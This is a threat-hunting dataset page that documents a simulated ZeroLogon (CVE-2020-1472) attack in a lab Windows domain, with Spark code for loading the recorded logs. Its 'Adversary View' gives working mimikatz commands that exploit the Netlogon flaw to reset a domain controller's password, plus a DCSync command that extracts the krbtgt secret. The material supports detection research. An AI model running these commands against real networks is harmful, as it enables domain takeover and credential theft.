# Password Update via Netlogon Insecure AES-CFB8

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-200916232559 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2020/09/16 |
| platform              | Windows |
| Tactic(s)             | ['[TA0008](https://attack.mitre.org/tactics/TA0008)'] |
| Technique(s)          | ['[T1210](https://attack.mitre.org/techniques/T1210)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/cobbr/Covenant/blob/7555b19ffb9401c0e37094c25e404a640b1688d7/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96', 'https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L23', 'https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon'] |
| Dataset Host           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip'] |
| Dataset Network           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip'] |
| References        | ['https://www.secura.com/blog/zero-logon', 'https://www.secura.com/pathtoimg.php?id=2055', 'https://twitter.com/gentilkiwi/status/1306178689630076929', 'https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon', 'https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc#theGroupPolicy'] |

## Dataset Description
This dataset represents adversaries leveraging a vulnerability (CVE-2020-1472) in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This vulnerability was discovered by [@@SecuraBV](https://twitter.com/SecuraBV).

## Adversary View
```
Mimikatz Implementation (NetrServerAuthenticate2)
=================================================

(wardog) > ShellCmd /shellcommand:"C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 16 2020 12:02:22
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/


mimikatz(commandline) # lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit

Target : MORDORDC.theshire.local
Account: MORDORDC$
Type   : 6 (Server)
Mode   : exploit

Trying to 'authenticate'...
============================================================================================================================================================================================================================================================================================================================================================================================================================================================

NetrServerAuthenticate2: 0x00000000
NetrServerPasswordSet2 : 0x00000000

* Authentication: OK -- vulnerable
* Set password  : OK -- may be unstable

mimikatz(commandline) # exit

Bye!

DCSync Follow-up (Optional)
(wardog) > ShellCmd /shellcommand:"C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe \"lsadump::dcsync /domain:theshire.local /dc:MORDORDC.theshire.local /user:krbtgt /authuser:MORDORDC$ /authdomain:theshire /authpassword:\\"\\" /authntlm\" exit"
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mimikatz_CVE-2020-1472_NetrServerAuthenticate2.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        